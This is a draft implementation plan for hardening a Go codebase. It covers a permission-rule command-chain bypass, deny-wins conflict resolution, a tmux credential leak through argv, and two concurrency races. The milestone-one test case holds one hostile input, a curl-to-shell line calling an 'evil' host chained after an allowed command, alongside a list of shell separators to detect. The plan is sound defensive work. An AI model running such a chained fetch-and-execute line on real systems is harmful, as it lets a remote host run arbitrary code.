---
id: SPEC-SEC-HARDEN-001
title: "Security & Concurrency Hardening — Implementation Plan"
version: "0.1.0"
status: draft
created: 2026-06-13
updated: 2026-06-13
author: GOOS행님
priority: P1
phase: "v3.0.0"
module: "internal/permission, internal/tmux, internal/lsp, internal/resilience, internal/cli/worktree"
lifecycle: spec-anchored
tags: "security, concurrency, plan, milestones, behavior-preservation"
era: V3R6
tier: L
---

# SPEC-SEC-HARDEN-001 — Implementation Plan

## §A. Context

5 HIGH-severity defects, one milestone each, across 4 packages. Tier L (thorough) because the changes touch security allow/deny logic, credential injection, and concurrency — behavior preservation is critical and each milestone requires a reproduction-first cycle. `cycle_type=tdd` (reproduction test FIRST is the RED phase; the defect is demonstrated before the fix).

## §B. Known Issues / Pre-flight Findings

All 5 line citations were verified against HEAD `0ef553617` during plan authoring. One minor citation adjustment to surface for GATE-2:

- M4 spawn prompt cited `loadBaselineLocked` at "line 113-130". In current code the function spans `tracker.go:112-130` (the `func` line is 112). The shared-state write `t.baseline = &baseline` is at **line 128** exactly, and `GetBaseline` is at **lines 69-84** (RLock at line 71). The defect is confirmed; only the function start line is off by one from the prompt.

All other citations (M1 `stack.go:127-128`, M2 `conflict.go:26-55` + `57-68`, M3 `tmux_integration.go:77-84` + `session.go:189-203` + `glm.go:389-408`, M5 `circuit.go:61-97` + `181-198`) matched the prompt exactly.

## §C. Pre-flight (run-phase entry checklist)

- [ ] Capture LSP baseline at phase start (zero errors expected).
- [ ] Confirm `go test ./internal/permission/... ./internal/tmux/... ./internal/lsp/... ./internal/resilience/... ./internal/cli/worktree/...` is green pre-change (baseline for no-regression).
- [ ] Confirm `go test -race` runs clean on M4/M5 packages pre-change EXCEPT for the new reproduction tests, which are expected to flag the race / invariant violation in RED.

## §D. Constraints

- Behavior-preserving for all non-defect paths (see spec.md §C — HARD).
- Reproduction test FIRST for every milestone (RED demonstrates the defect).
- Minimal fix; no drive-by refactors; match existing code style.
- M4/M5 verified under `go test -race`.
- No change to any public API signature unless strictly required by the fix (none anticipated).
- Each milestone is independent and may be committed separately (no inter-milestone code dependency).

## §E. Self-Verification

Per `.claude/rules/moai/core/agent-common-protocol.md` §Parallel Execution, the run-phase completion verification batch (single-turn multi-Bash) covers: full test suite, per-package coverage, `-race` on M4/M5, golangci-lint, CLI smoke. See acceptance.md §Quality Gate.

## §F. Milestones (M1-M5, priority-ordered; no time estimates)

### M1 — Permission `:*` prefix-match command-chain bypass [Priority High]

**Target**: `internal/permission/stack.go` `Matches` (lines 127-128 — the `:*` CutSuffix branch).

**Design decision** (see design.md §M1): When a `:*` prefix matches via `strings.HasPrefix(input, prefix)`, inspect the **remainder** (`input[len(prefix):]`) for an unquoted shell command separator. If one is present, return `false` (no match). Separators to detect: `;`, `&&`, `||`, `|`, `$(`, backtick (`` ` ``), and newline (`\n`). "Unquoted" means not enclosed in a single- or double-quoted segment of the remainder. The concrete separator-scan helper is a new unexported function in `stack.go` (e.g. `hasUnquotedShellSeparator(s string) bool`).

**Steps**:
1. RED: add table-driven `Matches` tests demonstrating that `Bash(go test:*)` currently matches `go test ./...; curl evil|sh` (assert the bypass exists pre-fix).
2. GREEN: add `hasUnquotedShellSeparator` + guard in the `:*` branch.
3. No-regression: legitimate prefix command still allowed; quoted-separator single command not falsely rejected; the other branches (`/*`, `*.`, exact) unchanged.

**Files**: `stack.go` (edit), `stack_test.go` (new cases).

### M2 — Permission conflict: deny wins on tie + audit log written [Priority High]

**Target**: `internal/permission/conflict.go` `resolveConflict` (26-55) + `logConflict` (57-68).

**Design decision** (see design.md §M2):
- **Deny-precedence**: in `resolveConflict`, after the `len==0`/`len==1` guards and `logConflict` call, scan the candidate rules; if any rule has `Action == DecisionDeny`, the tiebreak among the deny rules uses the existing specificity-then-Origin ordering but the winner is constrained to the deny set. Simplest behavior-preserving form: if ≥1 deny present, run the existing specificity/Origin loop **only over the deny rules**; otherwise run it over all rules unchanged. This guarantees deny wins on an equal-specificity allow+deny tie AND preserves the all-allow ordering exactly.
- **Conflict log write**: implement the body of `logConflict` to append a conflict record to `.moai/logs/permission.log` (create parent dir, append-open). Best-effort: errors are swallowed (must not change the decision). The `_ = origins` placeholder is replaced with an actual write. Update the existing `@MX:NOTE` referencing AC-12 to reflect that the write is now implemented.

**Intended-behavior-change casualty (D2)**: `internal/permission/conflict_test.go::TestResolveConflict_FsOrderTiebreak` (verified at HEAD `0ef553617`, lines 43-70) asserts that an equal-specificity allow+deny pair resolves to the ALLOW rule (fs-order/later-Origin winner, `z-settings.json`). REQ-SEC-M2-001 deliberately INVERTS this to deny-wins-on-tie, so this existing test WILL go red — it is testing the very defect M2 corrects, NOT a regression. This test MUST be **rewritten** in the M2 RED/GREEN cycle to assert deny-wins-on-tie (the deny rule from `a-settings.json` must win). It is the single carve-out from spec.md §C "existing package test suite MUST stay green". Do NOT preserve it green and do NOT treat its failure as a regression.

**Steps**:
1. RED: test that equal-specificity allow + deny currently resolves to the lexicographically-later Origin (which can be the allow) — assert the deny does NOT win pre-fix; AND a test asserting `permission.log` is NOT written pre-fix. (This RED reproduction is functionally the assertion that `TestResolveConflict_FsOrderTiebreak` currently encodes — confirm the pre-fix behavior, then rewrite that test in GREEN.)
2. GREEN: add deny-precedence scan; implement `logConflict` write; **rewrite `TestResolveConflict_FsOrderTiebreak`** to assert deny-wins-on-tie (the casualty above).
3. No-regression: all-allow equal-specificity tie keeps existing Origin-order winner; higher-specificity rule still wins regardless of action; single-rule / empty-rule paths unchanged; unwritable log dir does not change the returned decision.

**Files**: `conflict.go` (edit), `conflict_test.go` (rewrite `TestResolveConflict_FsOrderTiebreak` + new deny-precedence / log-write cases). The log path resolution must be project-root-relative and testable (inject the log dir or derive from a configurable root) — concrete seam is a run-phase decision (design.md §M2).

### M3 — tmux credential argv leak on worktree `--team` path [Priority High]

**Target**: `internal/cli/worktree/tmux_integration.go` lines 77-84 (the GLM/CG `InjectEnv` block). Canonical pattern to mirror: `internal/cli/glm.go:389-408`.

**Design decision** (see design.md §M3): Replace the single `tmuxMgr.InjectEnv(ctx, cfg.GLMEnvVars)` call with the glm.go pattern exactly:
1. `const sensitiveKey = "ANTHROPIC_AUTH_TOKEN"`.
2. If `token := cfg.GLMEnvVars[sensitiveKey]; token != ""`: `tmuxMgr.InjectSensitiveEnv(ctx, sensitiveKey, token)`; on error return wrapped error (NO argv fallback); `delete(cfg.GLMEnvVars, sensitiveKey)`.
3. If `len(cfg.GLMEnvVars) > 0`: `tmuxMgr.InjectEnv(ctx, cfg.GLMEnvVars)` for the remainder.

**Interface-seam design decision (D1, run-phase REQUIRED)**: `CreateTmuxSession` receives the `tmux.SessionManager` **interface** (verified at `tmux_integration.go:48 tmuxMgr tmux.SessionManager`). That interface (`session.go:50-59`) declares ONLY `Create` / `InjectEnv` / `ClearEnv` — it does **NOT** declare `InjectSensitiveEnv`. `InjectSensitiveEnv` exists only on the concrete `*DefaultSessionManager` (`session.go:271`). Therefore `tmuxMgr.InjectSensitiveEnv(...)` on the interface value **will NOT compile** as written. (glm.go's canonical fix compiles only because it calls `tmux.NewSessionManager()` which returns the concrete type, not the interface.) The correction in the spawn-prompt's earlier draft claim — "it must expose InjectSensitiveEnv (it does; same DefaultSessionManager)" — was **FALSE at the static-type level** and is retracted here.

**RECOMMENDED resolution**: extend the `tmux.SessionManager` interface with one additive method:

```go
// SessionManager (session.go:50-59) — add:
InjectSensitiveEnv(ctx context.Context, key, value string) error
```

This is the minimal behavior-preserving enabler: `*DefaultSessionManager` already implements it (the compile-time `var _ SessionManager = (*DefaultSessionManager)(nil)` assertion at session.go:68 continues to hold), the M3 fix can then call `tmuxMgr.InjectSensitiveEnv(...)` through the interface, and any test fake/recorder substituted for the interface gains a typed seam to assert argv. No other interface method changes. This ONE additive method is explicitly carved into scope by spec.md §F.5 (see the §F.5 amendment); the broad "no tmux API refactor" exclusion otherwise contradicts the M3 fix and is narrowed to permit exactly this addition.

**Steps**:
1. RED: with a token present in `cfg.GLMEnvVars`, capture the argv passed to `tmux set-environment` (inject a fake/recording session manager or run-func) and assert the token value currently appears as a positional argv (the leak).
2. GREEN: apply the extract → InjectSensitiveEnv → delete → InjectEnv pattern.
3. No-regression: non-sensitive vars (model slots) still bulk-injected; on sensitive-injection failure no argv fallback and the error propagates; non-GLM/CG mode path unchanged (still no injection).

**Files**: `tmux_integration.go` (edit), `tmux_integration_test.go` (new cases). May require introducing a session-manager seam in the integration function so the test can record argv — concrete seam is a run-phase decision (design.md §M3).

### M4 — LSP regression tracker shared-state write under read lock [Priority Medium]

**Target**: `internal/lsp/hook/tracker.go` `GetBaseline` (69-84, RLock at 71) → `loadBaselineLocked` (112-130, write at 128).

**Design decision** (see design.md §M4): Change `GetBaseline` to acquire a write lock (`t.mu.Lock()`/`defer t.mu.Unlock()`) instead of `RLock`, OR implement double-checked locking (fast RLock read of `t.baseline != nil`, upgrade to write lock for the load). The simplest behavior-preserving fix is `Lock()` — the read path is not hot and correctness dominates. `loadBaselineLocked` already early-returns when `t.baseline != nil`, so under a write lock the second concurrent caller is a no-op load. `CompareWithBaseline` routes through `GetBaseline` and inherits the fix.

**Steps**:
1. RED: a `-race` test spawning N concurrent `GetBaseline` calls on a tracker with `t.baseline == nil`, asserting the race detector flags the write-write (test FAILS / races pre-fix).
2. GREEN: switch `GetBaseline` to a write lock (or double-checked locking).
3. No-regression: single-reader `GetBaseline` returns same value; `ErrBaselineNotFound` semantics for missing file and missing file-entry unchanged; `CompareWithBaseline` / `ClearBaseline` behavior unchanged.

**Files**: `tracker.go` (edit), `tracker_test.go` or a new `tracker_race_test.go` (new `-race` case).

### M5 — Circuit breaker: half-open permit + recovered callback goroutine [Priority Medium]

**Target**: `internal/resilience/circuit.go` `Call` (61-97) + `transitionTo` (181-198, goroutine at 196).

**Design decision** (see design.md §M5):
- **Half-open single permit**: add a half-open in-flight guard (e.g. `halfOpenInFlight bool` field). In `Call`, after `checkState()` under the lock: if the resulting state is `StateHalfOpen`, atomically (under the same lock) check the guard — if already set, reject with `ErrCircuitOpen` (and count the rejection); if not set, set it and proceed to run `fn()`. After `fn()` resolves, under the post-call lock, clear the guard. The guard must be cleared on every resolution path (success, failure, and on transition out of half-open).
- **Recovered goroutine**: wrap the `OnStateChange` goroutine body in a `defer func(){ recover() }()` (or a small named helper) so a panic in the callback does not crash the process. Update the `@MX:WARN` at lines 193-194 to note the recover wrapper is now present (or demote per mx-tag-protocol since the danger is mitigated).

**Steps**:
1. RED: (a) a test launching N concurrent `Call`s while the breaker is half-open, asserting that currently MORE than one executes `fn()` (invariant absent pre-fix); (b) a test with a panicking `OnStateChange` callback asserting the process/test currently crashes or the panic is unrecovered pre-fix.
2. GREEN: add the half-open permit guard + recover wrapper.
3. No-regression: closed→open threshold counting unchanged; open→half-open timeout promotion unchanged; half-open success→closed and failure→open transitions unchanged; metrics (TotalCalls/SuccessCount/FailureCount/RejectedCount) accounting unchanged for the single-permit path; `Reset()` synchronous callback path unchanged.

**Files**: `circuit.go` (edit), `circuit_test.go` (new `-race` cases).

## §G. Anti-Patterns to Avoid

- Fixing M1 by escaping/rejecting ALL inputs containing a separator character regardless of quoting (would break legitimate single commands with quoted separators — REQ-SEC-M1-004).
- Fixing M2 by sorting on `Action` string lexicographically (`"allow"` < `"deny"`) — that is incidental and fragile; use explicit deny-precedence.
- Fixing M3 by leaving the token in the map and merely "also" calling `InjectSensitiveEnv` (the token must be `delete`d so the bulk `InjectEnv` never sees it).
- Fixing M4 by adding a `sync.Once` that changes the lazy-load semantics observably (the contract must stay identical; only the locking changes).
- Fixing M5 by making `OnStateChange` synchronous (changes timing/blocking behavior — REQ-SEC-M5-004 requires preserving the async dispatch; only add recover).
- Any drive-by refactor of adjacent code "while I'm here".

## §H. Cross-References

- design.md — per-milestone design rationale and trade-offs.
- research.md — verified evidence, prior-art references (SPEC-V3R5-SECURITY-CRIT-001 P0-2, mx-tag-protocol), CWE-214.
- acceptance.md — testable AC per milestone with Given-When-Then.
- `.claude/rules/moai/core/agent-common-protocol.md` §Parallel Execution — verification batch.
